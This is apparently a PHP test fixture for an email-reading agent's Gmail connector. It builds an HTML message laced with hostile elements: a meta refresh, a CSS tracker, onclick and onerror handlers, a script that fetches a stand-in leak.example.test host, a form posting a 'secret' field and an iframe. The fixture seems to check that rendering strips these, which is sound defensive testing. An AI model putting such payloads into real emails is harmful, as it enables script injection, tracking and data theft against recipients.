<?php
declare(strict_types=1);
require_once dirname(__DIR__,2).'/includes/agent-connection-gmail-v1.php';

$html = <<<'HTML'
<!doctype html><html><head>
<meta http-equiv="refresh" content="0;url=https://leak.example.test/redirect">
<style>
  body { margin:0; font:16px Arial,sans-serif; color:#24334a; background:#fff; }
  .title { color:#7b277c; font-size:26px; margin:0 0 12px; }
  .card > p { line-height:1.6; }
  .card { padding:24px; background:#faf1fa; border-radius:12px; }
  .tracker { background-image:url(https://leak.example.test/css); }
  @media(max-width:500px){ .card { padding:14px; } .title { font-size:22px; } }
</style></head><body>
<div class="card"><h1 class="title">Friday’s project update</h1>
<p>Hi David,</p><p>This message keeps its <strong>formatting</strong>, spacing, colors, and tables.</p>
<table style="width:100%;border-collapse:collapse"><tbody><tr><th align="left" bgcolor="#ead8ec" style="padding:12px">Project</th><th align="left" bgcolor="#ead8ec" style="padding:12px">Next step</th></tr><tr><td style="padding:12px">Gmail specialist</td><td style="padding:12px">Review the composer</td></tr></tbody></table>
<p><a href="https://project.example.test/review" onclick="window.parent.EMAIL_ATTACK=true">Open project details</a></p>
<img alt="Sender’s banner" width="600" height="160" src="https://images.example.test/banner.png" onerror="window.parent.EMAIL_ATTACK=true">
<img alt="Blocked local request" src="https://read.test/private-action">
<p>Thanks,<br>The project team</p></div>
<script>window.parent.EMAIL_ATTACK=true;fetch('https://leak.example.test/script')</script>
<form action="https://leak.example.test/form"><input name="secret"></form>
<iframe src="https://leak.example.test/frame"></iframe>
</body></html>
HTML;
$raw = ['id'=>'fixture-html','threadId'=>'fixture-thread','labelIds'=>['INBOX'], 'internalDate'=>'1700000000000',
    'snippet'=>'Friday project update', 'payload'=>['mimeType'=>'multipart/alternative',
        'headers'=>[['name'=>'From','value'=>'sender@example.test'],['name'=>'Subject','value'=>'Friday’s project update']],
        'parts'=>[
            ['mimeType'=>'text/plain','body'=>['data'=>rtrim(strtr(base64_encode("Hi David,\nThis is the plain-text version.\nhttps://project.example.test/review"),'+/','-_'),'=')]],
            ['mimeType'=>'text/html','body'=>['data'=>rtrim(strtr(base64_encode($html),'+/','-_'),'=')]],
        ]]];
$message = agent_connection_gmail_read_message_v1($raw,true);
echo json_encode(['subject'=>$message['subject'],'from'=>$message['from'],'body'=>$message['body'],'display'=>$message['display']],JSON_THROW_ON_ERROR);
